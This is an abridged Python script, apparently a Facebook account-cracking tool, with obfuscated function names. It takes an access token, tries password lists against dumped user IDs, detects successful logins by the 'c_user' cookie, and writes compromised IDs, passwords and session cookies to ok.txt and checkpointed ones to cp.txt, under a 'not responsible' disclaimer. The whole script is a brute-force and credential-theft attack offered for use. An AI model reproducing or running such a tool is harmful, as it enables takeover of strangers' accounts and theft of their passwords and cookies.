...
def ___RecodeSampah__():
	...
	try:
		...
		______DICKYXD______(f" \n {O}[{O}!{O}] Tokens must be fresh and EAAB💓💓 \n {O}[{O}!{O}] If the token is not EAAB then it will fail Dump")

		token = ______DickyGans______(f'{O} [{O}?{O}] Token : ')
		...
		try:
			...
			______DICKYXD______("\n %s[%s•%s] Welcome bro %s%s"%(P,H,P,H,nama));time.sleep(00.9)

			______DICKYXD______(" %s[%s•%s] Use These Tools Wisely "%(P,H,P));time.sleep(00.9)
			
			______DICKYXD______(" %s[%s•%s] I'm Not Responsible If Something Happens "%(P,H,P));time.sleep(00.9)
...
def ____MANUAL_____():
	...
	if pwek=="":
		...
		______DICKYXD______(' %s[%s+%s] %the results %sOK %save into -> %sok.txt'%(p,p,p,p,p,p,H))

		______DICKYXD______(' %s[%s+%s] %the results %sCP %save into -> %scp.txt'%(p,p,p,p,p,p,K))
...
def apii(uid, pwx):
	...
	for wk in list('\|-/'): 
		sys.stdout.write("\r %s[%s%s%s] [ %sCracking %s] %s/%s waiting/%s - bro/%s "%(rgb,K,wk,rgb,rgb,rgb,_______loop______, len(id), len(_______ok_______), len(_______cp_______)))
	...
	for pw in pwx:
		...
		if "c_user" in ses.cookies.get_dict().keys():
			...
			______DICKYXD______("\r %s[just now login] %s • %s • %s         "%(H,uid, pw,kukis))

			ok.append("%s • %s"%(uid, pw))

			open("ok.txt","a").write(" [just now login] %s • %s • %s\n"%(uid, pw,kukis))
			...
			try:
				...
				______DICKYXD______("\r %s\x1b[1;93m[After7 days] %s • %s • %s %s %s"%(K,uid, pw, day, month, year))
			...
			______DICKYXD______("\r %s\x1b[1;93m[After7 days] %s • %s         "%(K,uid, pw))
...
if __name__ == '__main__':
	...
	if sys.version[0]!="2":
		...
		______LuWibu______(" \033[0;97m[\033[0;91m!\033[0;97m] How To Usage : python Ze_ro.py")
